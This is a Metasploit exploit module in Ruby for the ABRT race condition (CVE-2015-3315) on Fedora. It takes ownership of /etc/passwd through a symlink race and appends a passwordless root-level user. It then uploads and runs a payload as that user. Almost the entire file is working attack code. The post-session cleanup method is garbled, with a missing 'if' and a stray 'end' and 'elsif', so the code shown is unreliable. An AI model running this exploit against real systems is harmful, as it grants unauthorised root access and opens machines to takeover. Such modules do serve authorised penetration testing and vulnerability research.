# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ABRT raceabrt Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Fedora systems with
        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured
        as the crash handler.
 
        A race condition allows local users to change ownership of arbitrary
        files (CVE-2015-3315). This module uses a symlink attack on
        &#039;/var/tmp/abrt/*/maps&#039; to change the ownership of /etc/passwd,
        then adds a new user with UID=0 GID=0 to gain root privileges.
        Winning the race could take a few minutes.
 
        This module has been tested successfully on ABRT packaged version
        2.1.5-1.fc19 on Fedora Desktop 19 x86_64, 2.2.1-1.fc19 on Fedora Desktop
        19 x86_64 and 2.2.2-2.fc20 on Fedora Desktop 20 x86_64.
 
        Fedora 21 and Red Hat 7 systems are reportedly affected, but untested.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Tavis Ormandy&#039;, # Discovery and C exploit
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 14 2015&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-3315&#039; ],
          [ &#039;EDB&#039;, &#039;36747&#039; ],
          [ &#039;BID&#039;, &#039;75117&#039; ],
          [ &#039;URL&#039;, &#039;https://gist.github.com/taviso/fe359006836d6cd1091e&#039; ],
          [ &#039;URL&#039;, &#039;http://www.openwall.com/lists/oss-security/2015/04/14/4&#039; ],
          [ &#039;URL&#039;, &#039;http://www.openwall.com/lists/oss-security/2015/04/16/12&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/abrt/abrt/commit/80408e9e24a1c10f85fd969e1853e0f192157f92&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/security/cve/cve-2015-1862&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/security/cve/cve-2015-3315&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/articles/1415483&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1211223&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1211835&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1218239&#039; ]
        ]
    ))
    register_options(
      [
        OptInt.new(&#039;TIMEOUT&#039;, [ true, &#039;Race timeout (seconds)&#039;, &#039;900&#039; ]),
        OptString.new(&#039;USERNAME&#039;, [ false, &#039;Username of new UID=0 user (default: random)&#039;, &#039;&#039; ]),
        OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end
 
  def base_dir
    datastore[&#039;WritableDir&#039;]
  end
 
  def timeout
    datastore[&#039;TIMEOUT&#039;]
  end
 
  def check
    if cmd_exec(&#039;lsattr /etc/passwd&#039;).include? &#039;i&#039;
      vprint_error &#039;File /etc/passwd is immutable&#039;
      return CheckCode::Safe
    end
 
    kernel_core_pattern = cmd_exec &#039;grep abrt-hook-ccpp /proc/sys/kernel/core_pattern&#039;
    unless kernel_core_pattern.include? &#039;abrt-hook-ccpp&#039;
      vprint_error &#039;System is NOT configured to use ABRT for crash reporting&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;System is configured to use ABRT for crash reporting&#039;
 
    if cmd_exec(&#039;[ -d /var/spool/abrt ] && echo true&#039;).include? &#039;true&#039;
      vprint_error "Directory &#039;/var/spool/abrt&#039; exists. System has been patched."
      return CheckCode::Safe
    end
    vprint_good &#039;System does not appear to have been patched&#039;
 
    unless cmd_exec(&#039;[ -d /var/tmp/abrt ] && echo true&#039;).include? &#039;true&#039;
      vprint_error "Directory &#039;/var/tmp/abrt&#039; does NOT exist"
      return CheckCode::Safe
    end
    vprint_good "Directory &#039;/var/tmp/abrt&#039; exists"
 
    if cmd_exec(&#039;systemctl status abrt-ccpp | grep Active&#039;).include? &#039;inactive&#039;
      vprint_error &#039;abrt-ccp service NOT running&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;abrt-ccpp service is running&#039;
 
    abrt_version = cmd_exec(&#039;yum list installed abrt | grep abrt&#039;).split(/\s+/)[1]
    unless abrt_version.blank?
      vprint_status "System is using ABRT package version #{abrt_version}"
    end
 
    CheckCode::Detected
  end
 
  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
    register_file_for_cleanup path
  end
 
  def exploit
    if check != CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end
 
    @chown_file = &#039;/etc/passwd&#039;
 
    if datastore[&#039;USERNAME&#039;].blank?
      @username = rand_text_alpha rand(7..10)
    else
      @username = datastore[&#039;USERNAME&#039;]
    end
 
    # Upload Tavis Ormandy&#039;s raceabrt exploit:
    # - https://www.exploit-db.com/exploits/36747/
    # Cross-compiled with:
    # - i486-linux-musl-cc -static raceabrt.c
    path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2015-3315&#039;, &#039;raceabrt&#039;
    fd = ::File.open path, &#039;rb&#039;
    executable_data = fd.read fd.stat.size
    fd.close
 
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    upload_and_chmodx executable_path, executable_data
 
    # Change working directory to base_dir
    cmd_exec "cd &#039;#{base_dir}&#039;"
 
    # Launch raceabrt executable
    print_status "Trying to own &#039;#{@chown_file}&#039; - This might take a few minutes (Timeout: #{timeout}s) ..."
    output = cmd_exec "#{executable_path} #{@chown_file}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
 
    # Check if we own /etc/passwd
    unless cmd_exec("[ -w #{@chown_file} ] && echo true").include? &#039;true&#039;
      fail_with Failure::Unknown, "Failed to own &#039;#{@chown_file}&#039;"
    end
 
    print_good "Success! &#039;#{@chown_file}&#039; is writable"
 
    # Add new user with no password
    print_status "Adding #{@username} user to #{@chown_file} ..."
    cmd_exec "echo &#039;#{@username}::0:0::/root:/bin/bash&#039; >> #{@chown_file}"
 
    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe
 
    # Execute payload executable
    vprint_status &#039;Executing payload...&#039;
    cmd_exec "/bin/bash -c \"echo #{payload_path} | su - #{@username}&\""
  end
 
  def on_new_session(session)
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
    end
 
    # Reinstate /etc/passwd root ownership and remove new user
    root_owns_passwd = false
    new_user_removed = false
 
      # Reinstate /etc/passwd root ownership
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"chown root:root #{@chown_file}\""
 
      # Remove new user
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"sed -i &#039;s/^#{@username}:.*$//g&#039; #{@chown_file}\""
 
      # Wait for clean up
      Rex.sleep 5
 
      # Check root ownership
      passwd_stat = session.fs.file.stat(@chown_file).stathash
      if passwd_stat[&#039;st_uid&#039;] == 0 && passwd_stat[&#039;st_gid&#039;] == 0
        root_owns_passwd = true
      end
 
      # Check for new user in /etc/passwd
      passwd_contents = session.fs.file.open(@chown_file).read.to_s
      unless passwd_contents.include? "#{@username}:"
        new_user_removed = true
      end
    elsif session.type.to_s.eql? &#039;shell&#039;
      # Reinstate /etc/passwd root ownership
      session.shell_command_token "chown root:root #{@chown_file}"
 
      # Remove new user
      session.shell_command_token "sed -i &#039;s/^#{@username}:.*$//g&#039; #{@chown_file}"
 
      # Check root ownership
      passwd_owner = session.shell_command_token "ls -l #{@chown_file}"
      if passwd_owner.to_s.include? &#039;root&#039;
        root_owns_passwd = true
      end
 
      # Check for new user in /etc/passwd
      passwd_user = session.shell_command_token "grep &#039;#{@username}:&#039; #{@chown_file}"
      unless passwd_user.to_s.include? "#{@username}:"
        new_user_removed = true
      end
    end
 
    unless root_owns_passwd
      print_warning "Could not reinstate root ownership of #{@chown_file}"
    end
 
    unless new_user_removed
      print_warning "Could not remove user &#039;#{@username}&#039; from #{@chown_file}"
    end
  rescue => e
    print_error "Error during cleanup: #{e.message}"
  ensure
    super
  end
end

